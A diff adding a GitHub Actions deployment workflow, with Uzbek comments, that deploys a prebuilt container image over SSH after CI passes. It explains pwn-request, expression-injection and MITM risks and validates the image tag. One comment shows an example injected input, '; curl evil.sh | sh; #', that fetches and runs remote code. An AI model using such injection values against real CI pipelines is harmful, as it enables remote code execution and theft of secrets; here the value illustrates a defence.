@@ -1,0 +1,202 @@
+name: Deploy
+
+# ⚠️ FAQAT CI YASHIL BO'LGANDA ishga tushadi.
+#    `push` bo'lganda deploy CI bilan PARALLEL ketardi va sinovdan
+#    o'tmagan kod serverga chiqib ketishi mumkin edi.
+on:
+  workflow_run:
+    workflows: ["CI"]
+    branches: [main]
+    types: [completed]
+  workflow_dispatch:
+    inputs:
+      image_tag:
+        description: "Obraz tegi (bo'sh = CI qurgan oxirgisi). Orqaga qaytarish uchun eski SHA."
+        required: false
+        default: ""
+
+concurrency:
+  group: deploy-production
+  cancel-in-progress: false # ⚠️ Deploy'ni O'RTASIDA to'xtatmaymiz
+
+jobs:
+  deploy:
+    name: Serverga chiqarish
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+
+    # =====================================================================
+    # ⚠️⚠️ BU ILOVA MANBA KODINI CHECKOUT QILMAYDI — ATAYLAB
+    # =====================================================================
+    # `workflow_run` maqsad repozitoriy kontekstida ishlaydi va BARCHA
+    # sirlarga (SSH kaliti) ega bo'ladi. Agar bu yerda kod checkout
+    # qilinib, u ustida biror narsa bajarilsa ("pwn request"):
+    #
+    #   1. hujumchi repo'ni fork qiladi;
+    #   2. fork'da branch nomini `main` deb qo'yadi;
+    #   3. PR ochadi -> CI ishga tushadi -> `branches: [main]` filtri o'tadi;
+    #   4. deploy hujumchining kodini SIRLAR bilan bajaradi.
+    #
+    # Pastdagi `if` sharti buni to'sadi, lekin bunday himoyaga tayanish
+    # mo'rt: bitta shart o'chib qolsa teshik ochiladi.
+    #
+    # Shuning uchun TUZILISHNING O'ZI o'zgartirildi: obrazni CI quradi va
+    # GHCR ga yuboradi (ci.yml -> docker job), bu ilova esa faqat serverga
+    # ULANIB, tayyor obrazni tortadi. Checkout ham, build ham yo'q —
+    # bajariladigan begona kod ham yo'q.
+    #
+    # Yon foyda: obraz ikki marta qurilmaydi (deploy ~3 daqiqa tezlashdi).
+    if: >-
+      github.event_name == 'workflow_dispatch' ||
+      (github.event.workflow_run.conclusion == 'success' &&
+       github.event.workflow_run.event == 'push' &&
+       github.event.workflow_run.head_repository.full_name == github.repository)
+
+    environment:
+      name: production
+      # ⚠️ GitHub'da bu muhitga "required reviewers" qo'shsangiz, har
+      #    deploy qo'lda tasdiqlanadi. Yolg'iz ishlaganda ixtiyoriy.
+
+    permissions:
+      contents: read
+
+    steps:
+      # -------------------------------------------------------------- #
+      # Qaysi obraz chiqariladi
+      # -------------------------------------------------------------- #
+      # ⚠️ XAVFSIZLIK: `${{ ... }}` TO'G'RIDAN-TO'G'RI `run:` ichiga
+      #    yozilmaydi. GitHub uni skript MATNIGA almashtirib qo'yadi
+      #    (shell o'zgaruvchisi sifatida emas), ya'ni foydalanuvchi
+      #    kiritgan qiymat kod bo'lib bajarilishi mumkin:
+      #        image_tag = `; curl evil.sh | sh; #`
+      #    Qiymat `env:` orqali beriladi va "$VAR" ko'rinishida ishlatiladi.
+      - name: Teg aniqlash
+        id: teg
+        env:
+          XOM_TEG: ${{ inputs.image_tag }}
+          COMMIT_SHA: ${{ github.event.workflow_run.head_sha || github.sha }}
+          REPO: ${{ github.repository }}
+        run: |
+          TAG="$XOM_TEG"
+          if [ -z "$TAG" ]; then
+            TAG="${COMMIT_SHA:0:12}"
+          fi
+
+          # ⚠️ Ikkinchi himoya qatlami: bu qiymat keyin SSH orqali
+          #    MASOFAVIY shellga yuboriladi — u yerda bitta `;` yoki
+          #    backtick yetarli bo'lardi.
+          case "$TAG" in
+            *[!a-zA-Z0-9._-]*|"")
+              echo "::error::Teg yaroqsiz: faqat a-z A-Z 0-9 . _ - ruxsat"
+              exit 1
+              ;;
+          esac
+
+          IMAGE="ghcr.io/$(echo "$REPO" | tr '[:upper:]' '[:lower:]'):${TAG}"
+          echo "image=$IMAGE" >> "$GITHUB_OUTPUT"
+          echo "Chiqariladigan obraz: $IMAGE"
+
+      # -------------------------------------------------------------- #
+      # SSH
+      # -------------------------------------------------------------- #
+      - name: SSH kalitini tayyorlash
+        env:
+          SSH_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
+          KNOWN_HOSTS: ${{ secrets.SSH_KNOWN_HOSTS }}
+        run: |
+          install -m 700 -d ~/.ssh
+          printf '%s\n' "$SSH_KEY" > ~/.ssh/id_ed25519
+          chmod 600 ~/.ssh/id_ed25519
+          # ⚠️ `StrictHostKeyChecking=no` EMAS: u MITM hujumiga yo'l ochadi
+          #    (DNS yoki tarmoq buzilsa, SSH kaliti begona serverga ketadi).
+          #    Barmoq izi sir sifatida saqlanadi:  ssh-keyscan -t ed25519 <IP>
+          printf '%s\n' "$KNOWN_HOSTS" > ~/.ssh/known_hosts
+          chmod 600 ~/.ssh/known_hosts
+
+      # -------------------------------------------------------------- #
+      # Chiqarish
+      # -------------------------------------------------------------- #
+      - name: Deploy
+        env:
+          SSH_HOST: ${{ secrets.SSH_HOST }}
+          SSH_USER: ${{ secrets.SSH_USER }}
+          IMAGE: ${{ steps.teg.outputs.image }}
+          GHCR_USER: ${{ github.actor }}
+          GHCR_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          # ⚠️ Heredoc chegarasi QO'SHTIRNOQDA ('REMOTE') — skript
+          #    runner'da emas, SERVERDA kengaytiriladi. Kerakli qiymatlar
+          #    ssh buyrug'ining boshida o'zgaruvchi sifatida beriladi.
+          ssh -o BatchMode=yes "${SSH_USER}@${SSH_HOST}" \
+              "IMAGE='${IMAGE}' GHCR_USER='${GHCR_USER}' GHCR_TOKEN='${GHCR_TOKEN}' bash -s" <<'REMOTE'
+            set -euo pipefail
+            cd /opt/dard
+
+            # GHCR paketi shaxsiy bo'lsa kirish kerak. Ommaviy bo'lsa ham
+            # zarar qilmaydi.
+            echo "$GHCR_TOKEN" | docker login ghcr.io -u "$GHCR_USER" --password-stdin
+
+            # Joriy obrazni saqlaymiz — orqaga qaytarish uchun
+            grep '^DARD_IMAGE=' .env > .env.oldingi_obraz 2>/dev/null || true
+
+            # ⚠️ `sed` EMAS: obraz manzilida `/` bor va u sed ajratgichi
+            #    bilan chalkashadi. Qatorni o'chirib qayta yozamiz.
+            grep -v '^DARD_IMAGE=' .env > .env.yangi
+            echo "DARD_IMAGE=${IMAGE}" >> .env.yangi
+            mv .env.yangi .env
+            chmod 600 .env
+
+            echo "==> Obraz tortilmoqda: ${IMAGE}"
+            docker compose -f docker-compose.server.yml pull
+
+            echo "==> Ishga tushirilmoqda"
+            docker compose -f docker-compose.server.yml up -d --remove-orphans
+
+            echo "==> Eski obrazlar tozalanmoqda (7 kundan eski)"
+            docker image prune -f --filter "until=168h"
+
+            docker logout ghcr.io >/dev/null 2>&1 || true
+          REMOTE
+
+      # -------------------------------------------------------------- #
+      # Haqiqatan ishlayaptimi
+      # -------------------------------------------------------------- #
+      # ⚠️ Busiz deploy "muvaffaqiyatli" deb ko'rinadi, sayt esa yiqilgan
+      #    bo'lishi mumkin: konteyner ko'tarildi -> restart siklida qoldi.
+      - name: Sog'liq tekshiruvi
+        env:
+          SSH_HOST: ${{ secrets.SSH_HOST }}
+          SSH_USER: ${{ secrets.SSH_USER }}
+        run: |
+          for i in $(seq 1 20); do
+            if ssh -o BatchMode=yes "${SSH_USER}@${SSH_HOST}" \
+                 'curl -fsS --max-time 5 http://127.0.0.1/health/' 2>/dev/null | grep -q ok; then
+              echo "Sog'lom (urinish $i)"
+              exit 0
+            fi
+            echo "Kutilmoqda... ($i/20)"
+            sleep 10
+          done
+          echo "::error::Sog'liq tekshiruvi 200 soniyada o'tmadi"
+          ssh -o BatchMode=yes "${SSH_USER}@${SSH_HOST}" \
+            'cd /opt/dard && docker compose -f docker-compose.server.yml ps && docker compose -f docker-compose.server.yml logs --tail=60 web'
+          exit 1
+
+      - name: Xulosa
+        if: always()
+        env:
+          IMAGE: ${{ steps.teg.outputs.image }}
+          COMMIT_SHA: ${{ github.event.workflow_run.head_sha || github.sha }}
+          NATIJA: ${{ job.status }}
+        run: |
+          {
+            echo "### Deploy"
+            echo ""
+            echo "| | |"
+            echo "|---|---|"
+            echo "| Obraz | \`${IMAGE}\` |"
+            echo "| Commit | \`${COMMIT_SHA}\` |"
+            echo "| Natija | ${NATIJA} |"
+            echo ""
+            echo "Orqaga qaytarish: Actions -> Deploy -> Run workflow -> eski teg."
+          } >> "$GITHUB_STEP_SUMMARY"
